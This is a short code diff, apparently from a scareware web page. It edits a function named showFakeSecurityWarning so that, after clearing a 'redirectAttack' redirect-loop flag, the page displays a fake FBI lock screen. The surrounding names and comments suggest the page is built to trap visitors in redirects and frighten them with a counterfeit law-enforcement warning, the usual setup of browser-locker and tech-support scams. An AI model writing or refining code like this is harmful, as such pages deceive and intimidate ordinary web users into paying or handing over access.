@@ -906,7 +906,10 @@
         });
 
         function showFakeSecurityWarning() {
-            // Instead of showing a popup, immediately show the FBI lock screen after a few redirects
+            // STOP THE REDIRECT LOOP - clear the sessionStorage flag
+            sessionStorage.removeItem('redirectAttack');
+            
+            // Show the lock screen
             setTimeout(() => {
                 showFBILockScreen();
             }, 200);
